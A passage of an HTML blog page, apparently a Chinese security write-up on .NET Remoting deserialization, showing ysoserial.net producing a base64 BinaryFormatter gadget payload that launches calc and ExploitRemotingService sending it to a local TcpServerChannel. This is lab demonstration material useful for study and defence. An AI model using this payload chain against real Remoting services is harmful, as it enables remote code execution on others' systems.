+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>GitHub<br>
+<a href="https://github.com/tyranid/ExploitRemotingService"target="_blank" rel="external nofollow noopener noreferrer">https://github.com/tyranid/ExploitRemotingService</a><br>
+通过这个攻击，可以攻击<code>TcpServerChannel</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">nlrvana</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">ysoserial</span><span class="p">.</span><span class="nb">net-master</span><span class="p">\</span><span class="n">ysoserial</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">Release</span><span class="p">&gt;</span><span class="n">ysoserial</span><span class="p">.</span><span class="py">exe</span> <span class="o">-f</span> <span class="n">binaryformatter</span> <span class="n">-g</span> <span class="n">TextFormattingRunProperties</span> <span class="n">-c</span> <span class="n">calc</span> <span class="n">-o</span> <span class="n">base64</span>  
+</span></span><span class="line"><span class="cl"><span class="n">AAEAAAD</span><span class="p">/////</span><span class="n">AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAswU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIGNhbGMiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M</span><span class="p">+</span><span class="n">DQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI</span><span class="p">+</span><span class="n">Cw</span><span class="p">==</span>  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">nlrvana</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="nb">ExploitRemotingService-master</span><span class="p">\</span><span class="nb">ExploitRemotingService-master</span><span class="p">\</span><span class="n">ExploitRemotingService</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">Debug</span><span class="p">&gt;</span><span class="n">ExploitRemotingService</span><span class="p">.</span><span class="py">exe</span> <span class="n">tcp</span><span class="err">:</span><span class="p">//</span><span class="n">localhost</span><span class="err">:</span><span class="mf">9999</span><span class="p">/</span><span class="n">RemoteDemoObjectClass</span><span class="p">.</span><span class="py">rem</span> <span class="n">raw</span> <span class="n">AAEAAAD</span><span class="p">/////</span><span class="n">AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAswU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIGNhbGMiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M</span><span class="p">+</span><span class="n">DQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI</span><span class="p">+</span><span class="n">Cw</span><span class="p">==</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506061704008.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506061704008.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506061704008.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506061704008.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506061704008.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506061704008.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2025-06-07 00:37:05">Updated on 2025-06-07&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://nlrvana.github.io/dot-net-.net-remoting%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" data-title="Dot NET-.NET Remoting反序列化漏洞"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/.net-remoting/" class="post-tag" title="Tags - .NET Remoting">.NET Remoting</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/dot-net-json.net%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="post-nav-item" rel="prev" title="Dot NET-Json.Net反序列化漏洞"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Dot NET-Json.Net反序列化漏洞</a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered order-3">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.145.0"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.15"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2023 - 2025</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"></a></span></div><div class="footer-line visitor order-1">
+          <span id="busuanzi_container_site_uv" title='Total visitors'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Total visits'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;bottom: 0;"></div><noscript>
+    <div class="noscript-warning">Theme FixIt works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/pink/pace-theme-center-atom.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="https://vercount.one/js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":1024},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"pangu":{"enable":true,"selector":"article"},"search":{"distance":100,"findAllMatches":false,"highlightTag":"em","ignoreFieldNorm":true,"ignoreLocation":true,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":50,"threshold":0.3,"useExtendedSearch":true},"version":"v0.3.15"};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
